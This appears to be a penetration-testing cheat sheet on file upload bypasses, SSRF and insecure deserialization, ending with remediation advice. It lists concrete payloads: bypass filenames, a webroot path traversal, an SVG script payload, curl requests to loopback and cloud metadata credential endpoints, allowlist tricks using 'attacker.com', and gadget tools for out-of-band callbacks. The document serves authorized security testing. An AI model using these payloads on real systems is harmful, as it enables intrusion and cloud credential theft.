# Upload / SSRF / Deserialization Recipes

> Authorized/non-prod. Benign canaries only. SSRF stays inside your environment.

## File upload — bypass matrix
Try each against the upload endpoint, then check **where the file lands** and **if it executes**:
- **Extension:** `f.php`, `f.php.jpg`, `f.jpg.php`, `f.pHp`, `f.phtml`, `f.php5`, `f.php%00.jpg`,
  trailing dot/space `f.php.`, `f.php::$DATA` (IIS).
- **Content-Type header:** set `image/png` on a script; or correct magic bytes + script trailer.
- **Magic-byte/polyglot:** prepend `GIF89a;` to a PHP file; valid image header + payload.
- **Path traversal in filename:** `../../../var/www/html/s.php`, `..%2f`, absolute paths.
- **Archive (zip-slip):** entry name `../../evil` in an uploaded zip/tar that's extracted.
- **Parser abuse:**
  - SVG → XXE/stored XSS: `<svg><script>alert(1)</script></svg>` or external entity.
  - Office/XML → XXE; image libs → known CVEs (ImageMagick/Ghostscript).
- **Confirm RCE safely:** upload a file that echoes a benign marker; request its URL; see the
  marker. Don't drop a real webshell on shared infra.

Defense check: stored outside webroot? random server-generated name? non-executable? content
re-encoded/validated? size & rate limited?

## SSRF — detection & escalation
```bash
# 1) OOB canary first (proves the server fetches your URL)
#    point the feature at http://COLLAB.oast.fun and watch for the hit (your interactsh/Collaborator id)
# 2) internal reach
curl "URL/fetch?url=http://127.0.0.1:80/"      # or 169.254.x, 10.x, 192.168.x
# 3) cloud metadata (benign read)
#    AWS:  http://169.254.169.254/latest/meta-data/
#    AWS IAM creds: .../latest/meta-data/iam/security-credentials/<role>
#    GCP:  http://metadata.google.internal/computeMetadata/v1/  (needs Metadata-Flavor: Google)
#    Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Metadata: true)
```
**Allowlist/parser bypasses to try:**
- IP encodings: `0x7f000001`, `2130706433`, `017700000001`, `127.1`, `[::1]`, `[::ffff:127.0.0.1]`.
- Tricks: `http://attacker.com@127.0.0.1`, `http://127.0.0.1#@allowed`, trailing dot, uppercase.
- **DNS rebinding:** a host that resolves to allowed then to internal (TOCTOU on resolution).
- **Redirect:** allowed URL that 302s to an internal target.
- Schemes: `file://`, `gopher://`, `dict://` if the client supports them.

## Insecure deserialization
- Locate serialized data: base64 blobs in cookies/params; Java `rO0`, PHP `O:`, Python pickle opcodes.
- Confirm: tamper a field; server behavior changes = it's deserializing untrusted input.
- Safe proof: craft a gadget that does an **OOB DNS/HTTP callback** (no destruction).
- Tools: `ysoserial` (Java), `phpggc` (PHP) — use only against your own app, benign gadget.

## Map → fix
Uploads: allowlist content (not just extension), re-encode images, random names, store outside
webroot, serve via a handler that never executes. SSRF: strict destination allowlist, resolve-then-
validate, block link-local/internal CIDRs, enforce IMDSv2, disable unused URL schemes. Deserialize:
prefer JSON/data-only formats; if unavoidable, sign payloads + type-allowlist + sandbox.
